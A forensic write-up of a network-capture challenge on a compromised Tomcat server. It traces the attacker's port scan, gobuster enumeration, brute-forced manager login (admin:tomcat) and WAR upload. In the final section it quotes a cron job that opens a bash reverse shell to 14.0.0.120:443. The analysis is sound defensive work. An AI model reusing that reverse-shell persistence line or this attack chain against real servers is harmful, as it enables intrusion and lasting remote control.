Scenario: The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope of the attack.

Question 1: Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?

To detect port scanning activities, we need to find which host sent the most requests with little response packet. I will examine Conversation feature in the Wireshark. This feature aggregates total of packets between two hosts. The figure below show this:

<img src="./images/media/image6.png" style="width:6.26772in;height:2.84722in" />

Figure 1:

As we can see in the figure 1, the flow between 14.0.0.120 and 10.0.0.112 has the most packets were sent. The number of packets sent by 14.0.0.120 is much larger than packets sent from 10.0.0.112. This is an indicator for the port scanning pattern.

To verify this, we need to go back to the main interface of Wireshark and enter a query: tcp.flags.syn==1 && tcp.flag.ack==0. This query will search beginning packet in TCP 3 way hand shake (packet with SYN flag sent by client for establishing connection):

<img src="./images/media/image12.png" style="width:6.26772in;height:3.45833in" />

Figure 2:

Now, the results is more clearly. The public IP address 14.0.0.120 sent a lot of SYN packet to different port in a short time. These requests are not normal requests. This is probably SYN Scan (half open) attack.

=\> Answer: 14.0.0.120

Question 2: Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?

We have already the malicious IP from the previous step, I will search for this IP on geolocation sites to enrich more information associated with the IP. In this case, I will search for the IP on IPSHU:

<img src="./images/media/image14.png" style="width:6.26772in;height:3.81944in" />

Figure 3:

According to the site, the IP come from GuangZhou, Guangdong province in China

=\> Answer: China

Question 3: From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?

Follow related activities of the ip address 14.0.0.120, we can see the attacker is communicating with the webserver through HTTP traffic.

<img src="./images/media/image8.png" style="width:6.26772in;height:2.75in" />

Figure 4:

In the packet No. 20126, the attacker sent GET request with /admin resource. I expanded the “Hypertext Transfer Protocol” (HTTP) section, I realize that the attacker was targeting to the host 10.0.0.112 with destination port is 8080.

=\> Answer: port to access to admin panel: 8080

Question 4: Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

From the question 3 and the Figure 5 below, we can see in the HTTP section, User-Agent field displayed the name of the tool, gobuster version 3.6 to enumerate directories and files on our web server.

<img src="./images/media/image11.png" style="width:6.26772in;height:2.75in" />

Figure 5:

=\> Answer: The attacker used gobuster to enumerate files and directories on the System.

Question 5: After enumerating directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which directory related to the admin panel did the attacker uncover? (Provide the path including the leading slash, e.g. /path)

The attacker used gobuster tool to enumerate important and confidential directories on victim web server. In this PCAP file, I will proceed to analyze the subsequent records to know if the attacker find the administrative interface correct or not:

<img src="./images/media/image13.png" style="width:6.26772in;height:3.19444in" />

Figure 6:

As we can see in the Figure 6, the attacker sent a massive number of HTTP request with URI contain “manager” keyword and the site response with status code 404. The attacker was likely targeting related administrative pages.

=\> Answer: /manager

Question 6: After accessing the admin panel, the attacker brute-forced the login. What credentials did the attacker successfully use? (Provide them in username:password format)

Typically, basic authentication header contains the credentials the attacker attempt to login. Basic authentication is a simple method built into the HTTP protocol that allows a client (like a web browser or API tool) to verify its identity by sending a username and password with each request.

Apply the filter http.authbasic in Wireshark to find all requests using Basic Authentication and cross-reference these with the HTTP response codes.

<img src="./images/media/image9.png" style="width:6.26772in;height:3.20833in" />

Figure 7:

Inspect individual packet to view the credential attacker guessed and response code return in the response packet.

Another way more easier for analyze larger traffic is using NetworkMiner tool. Import the PCAP file into it and go to tab Credentials, this will show full credentials attacker used in brute-force attack and the corresponding traffic:

<img src="./images/media/image7.png" style="width:6.26772in;height:2.36111in" />

Figure 8:

I examined entire http basic authentication packets of the corresponding request displayed in Figure 7, the packet has no. range from 20533 to 20549 return code 401 - Unauthorized corresponding to wrong credential.

In the packet no. 20553, we can see it return with status code 200. This indicate the attacker brute-force successfully with credential “admin:tomcat”:

<img src="./images/media/image4.png" style="width:6.26772in;height:2.95833in" />

Figure 9:

Now, the attacker is provided a cookie to access the administrative page. He/she must have done further actions on our web server and the next questions, we will uncover it.

Question 7: Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

Because the uploading behaviour often associated with POST method, we need to filter these activities on wireshark:

<img src="./images/media/image10.png" style="width:6.26772in;height:3.33333in" />

Figure 10:

As shown in figure 10, just a couple of minutes, the attacker used credentials just stolen and upload a file into our web server. Let’s look at MIME section to view full of details about the file:

<img src="./images/media/image3.png" style="width:6.26772in;height:1.04167in" />

Figure 11:

file war was uploaded to our web server with the name randomly JXQOZY.war. A .war file (Web Application Archive) is a packaged deployment file format used to distribute and execute Java-based web applications. It functions like a specialized ZIP archive, bundling all the necessary files, components, and application settings into a single file so that it can be cleanly run on a server.

=\> Answer: JXQOZY.war

**Question 8:** After the attacker established a reverse shell on our server, the payload connects back to the attacker's machine. From the analysis, what is the callback destination in IP:port format?

We need to trace from the beginning packets initiated by the infected machine to understand big picture. I will enter the filter query in Wireshark to find the SYN packet in TCP 3 way handshake originated by our web server 10.0.0.112 (reverse connection to the attacker):

<img src="./images/media/image1.png" style="width:6.26772in;height:2.13889in" />

Figure 12:

As shown in Figure 12, there are 2 tcp session with other destination port (80 and 443). We need to examine each packet to understand what is inside in the TCP flow:

Right-click to the record we want to check → Follow → TCP Stream:

- First connection:

<img src="./images/media/image2.png" style="width:6.26772in;height:2.375in" />

Figure 13:

In the first connection corresponding to the tcp.stream eq 9461 is the port 80 shell. The attacker uses it to run whoami, cd /tmp, and then plant this cron job:

\* \* \* \* \* /bin/bash -c 'bash -i \>& /dev/tcp/14.0.0.120/443 0\>&1'

The 443 connection at frame 20689 is that cron job firing, so the attacker deliberately chose 443 for the persistence channel.

- Second Connection:

<img src="./images/media/image5.png" style="width:6.26772in;height:2.13889in" />

Figure 14:

It isn't really HTTP or TLS

Wireshark labels both connections as plain TCP, not HTTP or TLS. bash -i \>& /dev/tcp/IP/PORT opens a raw TCP socket and pipes the shell through it. The port number is only camouflage, and the traffic on 443 should also be cleartext.

The figure 14 indicate that the attacker accessed shell of our web server successfully. The table below summary callback actions of the attacker:

| Frame | Connection                        | Role                                                           |
|-------|-----------------------------------|----------------------------------------------------------------|
| 20646 | 10.0.0.112:55162 → 14.0.0.120:80  | The first reverse shell, triggered by the uploaded WAR payload |
| 20689 | 10.0.0.112:35790 → 14.0.0.120:443 | The persistence callback, triggered by the cron job            |
